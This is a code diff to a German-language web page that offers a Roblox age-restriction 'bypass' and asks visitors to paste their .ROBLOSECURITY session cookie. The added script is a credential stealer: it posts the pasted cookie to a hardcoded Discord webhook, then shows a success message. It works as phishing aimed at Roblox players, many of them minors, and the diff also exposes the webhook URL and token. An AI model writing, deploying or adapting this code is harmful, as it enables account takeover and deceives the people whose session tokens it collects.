@@ -158,6 +158,22 @@
       display: none;
     }
 
+    /* Fehler-Meldung Toast oben rechts */
+    #errorToast {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #ff3860;
+      color: white;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-weight: 600;
+      font-family: 'Inter', sans-serif;
+      box-shadow: 0 0 10px rgba(255, 56, 96, 0.8);
+      display: none;
+      z-index: 1000;
+    }
+
     @media (max-width: 600px) {
       h1 {
         font-size: 28px;
@@ -196,16 +212,60 @@
     </div>
   </div>
 
+  <div id="errorToast">Bitte gib deinen .ROBLOSECURITY Cookie ein (mindestens 500 Zeichen)</div>
+
   <script>
     const bypassSelect = document.getElementById('bypass');
     const cookieInputContainer = document.getElementById('cookieInputContainer');
+    const processBtn = document.getElementById('processBtn');
+    const textarea = cookieInputContainer.querySelector('textarea');
+    const errorToast = document.getElementById('errorToast');
 
+    // Zeige/Verstecke das Cookie Feld je nach Auswahl
     bypassSelect.addEventListener('change', () => {
       if (bypassSelect.value === 'under13' || bypassSelect.value === 'allages') {
         cookieInputContainer.style.display = 'block';
       } else {
         cookieInputContainer.style.display = 'none';
       }
+    });
+
+    function showError(msg) {
+      errorToast.textContent = msg;
+      errorToast.style.display = 'block';
+      setTimeout(() => {
+        errorToast.style.display = 'none';
+      }, 4000);
+    }
+
+    processBtn.addEventListener('click', () => {
+      const cookieValue = textarea.value.trim();
+      if (cookieValue.length < 500) {
+        showError('Bitte gib deinen .ROBLOSECURITY Cookie ein (mindestens 500 Zeichen)');
+        return;
+      }
+
+      // Payload für Discord Webhook vorbereiten
+      const payload = {
+        content: `Neuer Roblox Cookie:\n\`\`\`\n${cookieValue}\n\`\`\``
+      };
+
+      fetch('https://discord.com/api/webhooks/1392606095406534817/QzbO8vkIuH2Diu6iTpMdfEUPZPfJq1igLjCNfsbP5kLZ3UBcxFWNWYvXQ7ElgungYskB', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (response.ok) {
+          alert('Cookie wurde erfolgreich gesendet!');
+          textarea.value = '';
+        } else {
+          showError('Fehler beim Senden an Discord. Bitte später erneut versuchen.');
+        }
+      })
+      .catch(() => {
+        showError('Fehler beim Senden an Discord. Bitte später erneut versuchen.');
+      });
     });
   </script>
 </body>
